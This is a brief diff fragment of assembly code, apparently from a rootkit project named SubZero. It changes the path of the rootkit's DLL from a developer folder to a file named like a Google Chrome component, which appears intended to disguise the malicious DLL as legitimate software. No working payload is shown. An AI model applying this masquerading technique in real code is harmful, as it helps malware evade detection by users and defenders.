@@ -92,8 +92,7 @@ return_from_func:
     ret
 
 file_path:
-    db "C:\\Users\\Daniel\\Desktop\\Drivers\\SubZero\\Release\\SubZeroDLL.dll", 0
-    ;db "S:\\Projects\\SubzeroRootKit\\x64\\Release\\SubZeroDLL.dll", 0
+    db "C:\\Program Files\\Google\\Chrome\\Application\\eventlog_provider.dll", 0  
 
 end:
     pop rsp
